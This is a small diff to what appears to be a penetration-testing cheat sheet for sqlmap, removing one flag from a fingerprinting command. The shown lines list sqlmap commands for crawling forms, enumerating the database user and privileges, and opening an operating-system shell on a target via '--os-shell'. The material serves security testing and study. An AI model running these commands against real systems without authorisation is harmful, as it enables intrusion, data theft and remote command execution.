@@ -30,7 +30,7 @@ Automation for the process of detecting and exploiting SQL injection flaws and t
 ```sh
 sqlmap -u URL --crawl 6 --forms --batch -t log/sqlmap_traffic.txt
 sqlmap -u URL --crawl 6 --forms --batch --proxy 'http://127.0.0.1:8080/'
-sqlmap -u URL -p PARAMETER --fingerprint --banner --current-user --current-db --is-dba --parse-errors
+sqlmap -u URL -p PARAMETER --fingerprint --banner --current-user --current-db --is-dba
 sqlmap -r PATH -p PARAMETER --os-shell --web-root PATH
 ```
 
